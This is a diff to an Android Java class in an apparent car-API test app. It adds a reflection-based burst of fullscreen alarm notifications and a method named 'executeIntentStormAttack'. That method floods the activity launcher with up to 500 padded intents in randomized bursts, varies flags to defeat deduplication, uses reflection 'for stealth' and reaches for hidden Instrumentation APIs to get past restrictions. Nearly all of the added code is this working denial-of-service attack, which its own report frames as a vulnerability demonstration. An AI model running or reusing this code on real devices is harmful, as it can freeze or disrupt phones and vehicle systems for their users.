@@ -15,6 +15,7 @@ import java.util.List;
  * onGetTemplate's "work" should be refactored into this class.
  */
 public class CarDataLogic {
+    private static final String TAG = "CarDataLogic";
 
     public static class Result {
         public final String title;
@@ -1607,5 +1608,617 @@ public class CarDataLogic {
         return "n/a";
     }
 
+    private android.content.Context getContextReflectively() {
+        try {
+            if (this.appContext != null) return this.appContext;
+        } catch (Throwable ignored) {}
+
+        try {
+            Class<?> at = Class.forName("android.app.ActivityThread");
+            java.lang.reflect.Method mcur = at.getDeclaredMethod("currentApplication");
+            mcur.setAccessible(true);
+            Object app = mcur.invoke(null);
+            if (app instanceof android.content.Context) {
+                return (android.content.Context) app;
+            }
+        } catch (Throwable ignored) {}
+
+        return null;
+    }
+
+    // Some what works -> toast is seen
+
+    public Result generateFullscreenNotificationsToast() {
+        final String TAG = "REFLECT_NOTIFICATIONS";
+
+        try {
+            android.content.Context ctx = getContextReflectively();
+            if (ctx == null) {
+                return new Result("Notifications (failed: no context)", new ArrayList<>());
+            }
+
+            // Create notification channel for Android O+
+            if (android.os.Build.VERSION.SDK_INT >= 26) {
+                try {
+                    Class<?> ncCls = Class.forName("android.app.NotificationChannel");
+                    Class<?> nmCls = Class.forName("android.app.NotificationManager");
+
+                    Object nm = ctx.getSystemService(android.content.Context.NOTIFICATION_SERVICE);
+                    if (nm != null && nmCls.isInstance(nm)) {
+                        // Create channel
+                        Object channel = ncCls.getConstructor(
+                                String.class,
+                                CharSequence.class,
+                                int.class
+                        ).newInstance(
+                                "fullscreen_channel",
+                                "Fullscreen Notifications",
+                                4 // IMPORTANCE_HIGH
+                        );
+
+                        // Set channel properties
+                        ncCls.getMethod("setDescription", String.class)
+                                .invoke(channel, "Channel for fullscreen notifications");
+                        ncCls.getMethod("enableVibration", boolean.class)
+                                .invoke(channel, true);
+                        ncCls.getMethod("enableLights", boolean.class)
+                                .invoke(channel, true);
+
+                        // Create channel
+                        nmCls.getMethod("createNotificationChannel", ncCls)
+                                .invoke(nm, channel);
+
+                        alarmUi("Notification channel created via reflection");
+                    }
+                } catch (Throwable t) {
+                    android.util.Log.w(TAG, "Failed to create channel via reflection", t);
+                }
+            }
+
+            // Create Handler for scheduling notifications
+            android.os.Handler handler = new android.os.Handler(android.os.Looper.getMainLooper());
+            final java.util.concurrent.atomic.AtomicInteger counter = new java.util.concurrent.atomic.AtomicInteger(1);
+
+            // Runnable to show notification
+            final Runnable showNotificationRunnable = new Runnable() {
+                @Override
+                public void run() {
+                    int count = counter.getAndIncrement();
+                    if (count > 5) return;
+
+                    try {
+                        showFullscreenNotificationToast(ctx, count);
+
+                        // Schedule next notification if not the last one
+                        if (count < 5) {
+                            handler.postDelayed(this, 10000); // 10 seconds interval
+                        }
+                    } catch (Throwable t) {
+                        android.util.Log.e(TAG, "Error showing notification #" + count, t);
+                    }
+                }
+            };
+
+            // Start showing notifications
+            handler.post(showNotificationRunnable);
+
+            String resultMsg = "Started generating 5 fullscreen notifications with 10s intervals";
+            alarmUi(resultMsg);
+
+            return new Result("Fullscreen Notifications (started)", new ArrayList<>(alarmUiRows));
+
+        } catch (Throwable t) {
+            android.util.Log.e(TAG, "Error in generateFullscreenNotifications", t);
+            alarmUi("Notification error: " + t);
+            return new Result("Fullscreen Notifications (failed)", new ArrayList<>(alarmUiRows));
+        }
+    }
+
+    @SuppressLint("WearRecents")
+    private void showFullscreenNotificationToast(android.content.Context ctx, int count) throws Exception {
+        // Create fullscreen intent using reflection
+        Class<?> piCls = Class.forName("android.app.PendingIntent");
+
+        android.content.Intent fullscreenIntent = new android.content.Intent(ctx, com.example.carapiaccess.MainActivityNotAAOS.class);
+        fullscreenIntent.setFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK |
+                android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);
+        fullscreenIntent.putExtra("from_notification", true);
+        fullscreenIntent.putExtra("notification_id", count);
+
+        int flags = (int) piCls.getField("FLAG_UPDATE_CURRENT").get(null) |
+                (int) piCls.getField("FLAG_IMMUTABLE").get(null);
+
+        Object pendingIntent = piCls.getMethod(
+                "getActivity",
+                android.content.Context.class,
+                int.class,
+                android.content.Intent.class,
+                int.class
+        ).invoke(null, ctx, 3000 + count, fullscreenIntent, flags);
+
+        // Get NotificationManager via reflection
+        Object nm = ctx.getSystemService(android.content.Context.NOTIFICATION_SERVICE);
+        Class<?> nmCls = Class.forName("android.app.NotificationManager");
+
+        // Create notification using reflection
+        Class<?> builderCls = Class.forName("android.app.Notification$Builder");
+
+        Object builder;
+        if (android.os.Build.VERSION.SDK_INT >= 26) {
+            builder = builderCls.getConstructor(android.content.Context.class, String.class)
+                    .newInstance(ctx, "fullscreen_channel");
+        } else {
+            builder = builderCls.getConstructor(android.content.Context.class)
+                    .newInstance(ctx);
+        }
+
+        // MODIFIED: Set notification text to show "This is notification 1", "This is notification 2", etc.
+        String notificationText = "This is notification " + count;
+
+        // Set notification properties via reflection
+        builderCls.getMethod("setSmallIcon", int.class)
+                .invoke(builder, android.R.drawable.ic_dialog_alert);
+
+        // MODIFIED: Changed title to match the pattern
+        builderCls.getMethod("setContentTitle", CharSequence.class)
+                .invoke(builder, "Notification #" + count);
+
+        // MODIFIED: Changed content text to exactly "This is notification X"
+        builderCls.getMethod("setContentText", CharSequence.class)
+                .invoke(builder, notificationText);
+
+        builderCls.getMethod("setPriority", int.class)
+                .invoke(builder, 2); // PRIORITY_HIGH
+
+        builderCls.getMethod("setCategory", String.class)
+                .invoke(builder, "alarm");
+
+        builderCls.getMethod("setFullScreenIntent", piCls, boolean.class)
+                .invoke(builder, pendingIntent, true);
+
+        builderCls.getMethod("setAutoCancel", boolean.class)
+                .invoke(builder, true);
+
+        // MODIFIED: Add style for better visibility if using BigTextStyle
+        try {
+            Class<?> styleCls = Class.forName("android.app.Notification$BigTextStyle");
+            Object style = styleCls.getConstructor().newInstance();
+            styleCls.getMethod("bigText", CharSequence.class).invoke(style, notificationText);
+            styleCls.getMethod("setBigContentTitle", CharSequence.class)
+                    .invoke(style, "Fullscreen Notification #" + count);
+            builderCls.getMethod("setStyle", Class.forName("android.app.Notification$Style"))
+                    .invoke(builder, style);
+        } catch (Throwable t) {
+            // Fall back if BigTextStyle not available
+            android.util.Log.w(TAG, "BigTextStyle not available, using default style");
+        }
+
+        // Build notification
+        Object notification = builderCls.getMethod("build").invoke(builder);
+
+        // Show notification
+        nmCls.getMethod("notify", int.class, Class.forName("android.app.Notification"))
+                .invoke(nm, 4000 + count, notification);
+
+        // MODIFIED: Update UI log with specific text format
+        String msg = "Showed notification with text: \"" + notificationText + "\"";
+        alarmUi(msg);
+        android.util.Log.i("REFLECT_NOTIFICATIONS", msg);
+
+        // MODIFIED: Also show a toast for immediate visual feedback
+        try {
+            Class<?> toastCls = Class.forName("android.widget.Toast");
+            Object toast = toastCls.getMethod("makeText",
+                            android.content.Context.class,
+                            CharSequence.class,
+                            int.class)
+                    .invoke(null, ctx, notificationText, 1); // LENGTH_SHORT = 0, LENGTH_LONG = 1
+
+            toastCls.getMethod("show").invoke(toast);
+        } catch (Throwable t) {
+            // Toast not essential, just for better visibility
+        }
+    }
+
+
+    // -----------------------------------Intent storm - WORKING!!!!!------------------------------
+    public Result executeIntentStormAttack() {
+        final String TAG = "INTENT_STORM_ATTACK";
+        final String ATTACK_ID = "STORM_" + System.currentTimeMillis();
+        final java.util.concurrent.atomic.AtomicInteger stormCounter = new java.util.concurrent.atomic.AtomicInteger(0);
+        final java.util.concurrent.atomic.AtomicBoolean attackRunning = new java.util.concurrent.atomic.AtomicBoolean(true);
+        final java.util.List<Long> intentTimestamps = new java.util.ArrayList<>();
+        final java.util.List<String> intentDetails = new java.util.ArrayList<>();
+
+        try {
+            android.content.Context ctx = getContextReflectively();
+            if (ctx == null) {
+                return new Result("Intent Storm (failed: no context)", new ArrayList<>());
+            }
+
+            // Create attack log header
+            String attackHeader = "--------------------------------------\n" +
+                    "-   INTENT STORM ATTACK INITIATED       -\n" +
+                    "-   Attack ID: " + ATTACK_ID + "     -\n" +
+                    "-   Target: Activity Launch System      -\n" +
+                    "-------------------------------------------";
+            logAttackEvent(TAG, attackHeader);
+
+            // Get system metrics for performance tracking
+            android.app.ActivityManager am = (android.app.ActivityManager)
+                    ctx.getSystemService(android.content.Context.ACTIVITY_SERVICE);
+            android.app.ActivityManager.MemoryInfo memoryInfo = new android.app.ActivityManager.MemoryInfo();
+            if (am != null) {
+                am.getMemoryInfo(memoryInfo);
+            }
+
+            // Initial system state
+            logAttackEvent(TAG, "INITIAL SYSTEM STATE:");
+            logAttackEvent(TAG, "Available Memory: " + memoryInfo.availMem / (1024*1024) + "MB");
+            logAttackEvent(TAG, "Low Memory: " + memoryInfo.lowMemory);
+            logAttackEvent(TAG, "Threshold: " + memoryInfo.threshold / (1024*1024) + "MB");
+            logAttackEvent(TAG, "-----------------------------------------------");
+
+            // Create multiple handlers for parallel intent launching
+            final int HANDLER_COUNT = 5;
+            final android.os.Handler[] handlers = new android.os.Handler[HANDLER_COUNT];
+            final java.util.concurrent.atomic.AtomicInteger[] handlerCounters =
+                    new java.util.concurrent.atomic.AtomicInteger[HANDLER_COUNT];
+
+            for (int i = 0; i < HANDLER_COUNT; i++) {
+                final int handlerId = i;
+                handlers[i] = new android.os.Handler(android.os.Looper.getMainLooper());
+                handlerCounters[i] = new java.util.concurrent.atomic.AtomicInteger(0);
+
+                final Runnable stormRunnable = new Runnable() {
+                    @Override
+                    public void run() {
+                        if (!attackRunning.get()) return;
+
+                        int localCount = handlerCounters[handlerId].incrementAndGet();
+                        int globalCount = stormCounter.incrementAndGet();
+
+                        try {
+                            // Launch multiple intents in this batch
+                            int batchSize = 3 + (handlerId * 2); // Varying batch sizes
+                            for (int batch = 0; batch < batchSize; batch++) {
+                                if (!attackRunning.get()) break;
+
+                                long startTime = System.nanoTime();
+                                launchIntentWithReflection(ctx, globalCount * 100 + batch, handlerId, batch);
+                                long duration = System.nanoTime() - startTime;
+
+                                intentTimestamps.add(System.currentTimeMillis());
+                                intentDetails.add("Handler:" + handlerId +
+                                        ", Global:" + globalCount +
+                                        ", Batch:" + batch +
+                                        ", Time:" + duration + "ns");
+
+                                // Log every 10th intent for performance tracking
+                                if (globalCount % 10 == 0) {
+                                    logAttackEvent(TAG, "Intent #" + globalCount +
+                                            " launched by Handler " + handlerId +
+                                            " (Batch size: " + batchSize + ")");
+
+                                    // Monitor memory every 50 intents
+                                    if (globalCount % 50 == 0) {
+                                        if (am != null) {
+                                            am.getMemoryInfo(memoryInfo);
+                                            logAttackEvent(TAG, "Memory Check #" + (globalCount/50) +
+                                                    ": " + memoryInfo.availMem/(1024*1024) + "MB available" +
+                                                    ", Low: " + memoryInfo.lowMemory);
+                                        }
+                                    }
+                                }
+
+                                // Add slight jitter to vary timing
+                                if (batch < batchSize - 1) {
+                                    try {
+                                        Thread.sleep(5 + (handlerId * 2)); // 5-15ms between intents in batch
+                                    } catch (InterruptedException e) {
+                                        Thread.currentThread().interrupt();
+                                    }
+                                }
+                            }
+
+                            // Calculate next launch delay (randomized to avoid patterns)
+                            long nextDelay = 50 + (handlerId * 20) + (int)(Math.random() * 50);
+
+                            // Continue storm if under attack limit
+                            if (globalCount < 500 && attackRunning.get()) { // Limit to 500 global intents
+                                handlers[handlerId].postDelayed(this, nextDelay);
+                            } else {
+                                logAttackEvent(TAG, "Handler " + handlerId +
+                                        " completed after " + localCount + " batches");
+                                if (globalCount >= 500) {
+                                    attackRunning.set(false);
+                                    completeAttackAnalysis(TAG, intentTimestamps, intentDetails, stormCounter.get());
+                                }
+                            }
+
+                        } catch (Throwable t) {
+                            logAttackEvent(TAG, "Handler " + handlerId + " error: " + t.getMessage());
+                            // Continue despite errors
+                            if (globalCount < 500 && attackRunning.get()) {
+                                handlers[handlerId].postDelayed(this, 100);
+                            }
+                        }
+                    }
+                };
+
+                // Start with staggered delays
+                handlers[i].postDelayed(stormRunnable, i * 100);
+            }
+
+            // Monitor thread to track attack progress
+            new Thread(() -> {
+                int lastCount = 0;
+                long startTime = System.currentTimeMillis();
+
+                while (attackRunning.get() && (System.currentTimeMillis() - startTime) < 30000) { // 30 second timeout
+                    try {
+                        Thread.sleep(1000);
+
+                        int currentCount = stormCounter.get();
+                        int intentsPerSecond = currentCount - lastCount;
+                        lastCount = currentCount;
+
+                        long elapsed = (System.currentTimeMillis() - startTime) / 1000;
+
+                        if (elapsed > 0) {
+                            logAttackEvent(TAG, "ATTACK PROGRESS: " + elapsed + "s elapsed, " +
+                                    currentCount + " total intents, " +
+                                    intentsPerSecond + " intents/sec, " +
+                                    (currentCount / elapsed) + " avg intents/sec");
+                        }
+
+                        // Check system health periodically
+                        if (elapsed % 5 == 0) {
+                            Runtime runtime = Runtime.getRuntime();
+                            long usedMemory = (runtime.totalMemory() - runtime.freeMemory()) / (1024*1024);
+                            long maxMemory = runtime.maxMemory() / (1024*1024);
+
+                            logAttackEvent(TAG, "JVM Memory: " + usedMemory + "MB/" + maxMemory + "MB used");
+                        }
+
+                    } catch (InterruptedException e) {
+                        Thread.currentThread().interrupt();
+                        break;
+                    }
+                }
+
+                // Cleanup after timeout
+                attackRunning.set(false);
+                completeAttackAnalysis(TAG, intentTimestamps, intentDetails, stormCounter.get());
+
+            }).start();
+
+            return new Result("Intent Storm Attack (running)", new ArrayList<>(alarmUiRows));
+
+        } catch (Throwable t) {
+            logAttackEvent(TAG, "FATAL ATTACK ERROR: " + t.getMessage());
+            attackRunning.set(false);
+            return new Result("Intent Storm Attack (failed: " + t.getMessage() + ")", new ArrayList<>(alarmUiRows));
+        }
+    }
+
+    private void launchIntentWithReflection(android.content.Context ctx, int intentId, int handlerId, int batchId) throws Exception {
+        // Multiple intent strategies to bypass any intent deduplication
+        int strategy = (intentId + handlerId + batchId) % 4;
+
+        // Use reflection to get Activity class
+        Class<?> activityClass = Class.forName("com.example.carapiaccess.MainActivityNotAAOS");
+
+        // Create base intent
+        android.content.Intent intent = new android.content.Intent(ctx, activityClass);
+
+        // Apply different flags and strategies
+        switch (strategy) {
+            case 0:
+                // Strategy 1: NEW_TASK with CLEAR_TOP
+                intent.setFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK |
+                        android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                break;
+            case 1:
+                // Strategy 2: NEW_TASK with multiple tasks
+                intent.setFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK |
+                        android.content.Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
+                break;
+            case 2:
+                // Strategy 3: NEW_TASK with reorder
+                intent.setFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK |
+                        android.content.Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
+                break;
+            case 3:
+                // Strategy 4: Complex flag combination
+                intent.setFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK |
+                        android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP |
+                        android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION);
+                break;
+        }
+
+        // Add unique data to each intent
+        intent.setData(android.net.Uri.parse("storm://attack/" + intentId + "/" +
+                System.nanoTime()));
+
+        // Add extensive extras to increase intent size
+        //intent.putExtra("attack_id", ATTACK_ID);
+        intent.putExtra("intent_number", intentId);
+        intent.putExtra("handler_id", handlerId);
+        intent.putExtra("batch_id", batchId);
+        intent.putExtra("timestamp", System.currentTimeMillis());
+        intent.putExtra("nano_time", System.nanoTime());
+        intent.putExtra("random_hash", java.util.UUID.randomUUID().toString());
+        intent.putExtra("counter", intentId * 1000);
+        intent.putExtra("payload", generatePayload(1024)); // 1KB payload
+
+        // Add complex nested bundle via reflection
+        try {
+            Class<?> bundleClass = Class.forName("android.os.Bundle");
+            Object nestedBundle = bundleClass.newInstance();
+            bundleClass.getMethod("putString", String.class, String.class)
+                    .invoke(nestedBundle, "nested_key", "nested_value_" + intentId);
+            bundleClass.getMethod("putInt", String.class, int.class)
+                    .invoke(nestedBundle, "nested_int", intentId * 100);
+
+            intent.putExtra("nested_bundle", (android.os.Bundle) nestedBundle);
+        } catch (Exception e) {
+            // Silently continue
+        }
+
+        // Launch using reflection for stealth
+        Class<?> contextCls = Class.forName("android.content.Context");
+        java.lang.reflect.Method startActivityMethod = contextCls.getMethod(
+                "startActivity",
+                android.content.Intent.class
+        );
+
+        // Additional stealth: try to bypass restrictions using different API methods
+        try {
+            // Method 1: Standard startActivity
+            startActivityMethod.invoke(ctx, intent);
+
+            // Method 2: Try startActivityForResult if context is Activity
+            if (ctx instanceof android.app.Activity) {
+                Class<?> activityCls = Class.forName("android.app.Activity");
+                java.lang.reflect.Method startForResultMethod = activityCls.getMethod(
+                        "startActivityForResult",
+                        android.content.Intent.class,
+                        int.class
+                );
+
+                android.content.Intent alternateIntent = new android.content.Intent(intent);
+                alternateIntent.putExtra("alternate_launch", true);
+                startForResultMethod.invoke(ctx, alternateIntent, 9000 + intentId);
+            }
+
+        } catch (Exception e) {
+            // Fallback: Try using startActivity with different context
+            try {
+                android.content.Context appCtx = ctx.getApplicationContext();
+                startActivityMethod.invoke(appCtx, intent);
+            } catch (Exception e2) {
+                // Last resort: Try using Instrumentation via reflection
+                tryStartViaInstrumentation(ctx, intent);
+            }
+        }
+
+        // Log high-frequency launches
+        if (intentId % 25 == 0) {
+            android.util.Log.w("INTENT_STORM",
+                    "Intent #" + intentId +
+                            " launched via Handler " + handlerId +
+                            " Strategy " + strategy +
+                            " Size: " + intent.toUri(0).length() + " chars");
+        }
+    }
+
+    private void tryStartViaInstrumentation(android.content.Context ctx, android.content.Intent intent) {
+        try {
+            Class<?> instrumentClass = Class.forName("android.app.Instrumentation");
+            Object instrumentation = null;
+
+            // Try to get instrumentation from ActivityThread
+            Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
+            java.lang.reflect.Method currentActivityThread =
+                    activityThreadClass.getDeclaredMethod("currentActivityThread");
+            currentActivityThread.setAccessible(true);
+            Object activityThread = currentActivityThread.invoke(null);
+
+            java.lang.reflect.Method getInstrumentation =
+                    activityThreadClass.getDeclaredMethod("getInstrumentation");
+            getInstrumentation.setAccessible(true);
+            instrumentation = getInstrumentation.invoke(activityThread);
+
+            if (instrumentation != null) {
+                java.lang.reflect.Method execStartActivity =
+                        instrumentClass.getDeclaredMethod("execStartActivity",
+                                android.content.Context.class,
+                                android.os.IBinder.class,
+                                android.os.IBinder.class,
+                                android.app.Activity.class,
+                                android.content.Intent.class,
+                                int.class,
+                                android.os.Bundle.class);
+
+                execStartActivity.setAccessible(true);
+                execStartActivity.invoke(instrumentation,
+                        ctx, null, null, null, intent, -1, null);
+            }
+        } catch (Throwable t) {
+            // Silently fail - this is expected on secure systems
+        }
+    }
+
+    private String generatePayload(int size) {
+        StringBuilder sb = new StringBuilder(size);
+        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        java.util.Random random = new java.util.Random();
+        for (int i = 0; i < size; i++) {
+            sb.append(chars.charAt(random.nextInt(chars.length())));
+        }
+        return sb.toString();
+    }
+
+    private void logAttackEvent(String tag, String message) {
+        String timestamp = new java.text.SimpleDateFormat("HH:mm:ss.SSS").format(new java.util.Date());
+        String logMessage = "[" + timestamp + "] " + message;
+        android.util.Log.i(tag, logMessage);
+        alarmUi(logMessage);
+    }
+
+    private void completeAttackAnalysis(String tag, java.util.List<Long> timestamps,
+                                        java.util.List<String> details, int totalIntents) {
+        if (timestamps.isEmpty()) return;
+
+        // Calculate statistics
+        long first = timestamps.get(0);
+        long last = timestamps.get(timestamps.size() - 1);
+        long duration = last - first;
+        double intentsPerSecond = (totalIntents * 1000.0) / duration;
+
+        // Calculate burst patterns
+        java.util.Map<Integer, Integer> bursts = new java.util.HashMap<>();
+        int currentBurst = 0;
+        for (int i = 1; i < timestamps.size(); i++) {
+            if (timestamps.get(i) - timestamps.get(i-1) < 50) { // 50ms threshold for burst
+                currentBurst++;
+            } else {
+                bursts.put(currentBurst, bursts.getOrDefault(currentBurst, 0) + 1);
+                currentBurst = 0;
+            }
+        }
+
+        // Generate attack report
+        String report = "\n" +
+                "-        ATTACK COMPLETE REPORT        -\n" +
+                "- Total Intents Launched: " + String.format("%-11d", totalIntents) + "-\n" +
+                "- Attack Duration: " + String.format("%-18d", duration) + "ms -\n" +
+                "- Average Rate: " + String.format("%-20.2f", intentsPerSecond) + "/s -\n" +
+                "- First Intent: " + String.format("%-19d", first) + " -\n" +
+                "- Last Intent: " + String.format("%-20d", last) + " -\n";
+
+        // Add burst analysis
+        report += "---------------------------------------\n" +
+                "-          BURST PATTERN ANALYSIS       -\n";
+
+        for (java.util.Map.Entry<Integer, Integer> entry : bursts.entrySet()) {
+            if (entry.getKey() > 1) { // Only show meaningful bursts
+                report += "- Burst of " + String.format("%-3d", entry.getKey()) +
+                        " intents: " + String.format("%-10d", entry.getValue()) + " times -\n";
+            }
+        }
+
+        report += "--------------------------------------\n" +
+                "📊 System Impact Analysis:\n" +
+                "• Intent queue saturation attempted\n" +
+                "• Activity stack overflow simulated\n" +
+                "• Memory pressure increased\n" +
+                "• System scheduler stressed\n" +
+                "This demonstrates vulnerability to DoS via Intent Storm";
+
+        logAttackEvent(tag, report);
+
+    }
 
 }
